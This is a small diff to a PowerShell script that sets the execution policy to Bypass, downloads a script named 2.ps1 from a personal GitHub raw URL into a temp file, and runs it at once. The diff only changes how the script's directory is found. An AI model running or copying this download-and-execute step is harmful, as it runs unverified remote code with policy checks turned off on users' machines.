@@ -1,6 +1,8 @@
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
-$scriptPath = "$PSScriptRoot\temp_2.ps1"
+$scriptDir = if ($PSScriptRoot) { $PSScriptRoot } else { Split-Path -Parent $MyInvocation.MyCommand.Definition }
+
+$scriptPath = "$scriptDir\temp_2.ps1"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/truongcp0305/dp/main/2.ps1" -OutFile $scriptPath
 
 & $scriptPath
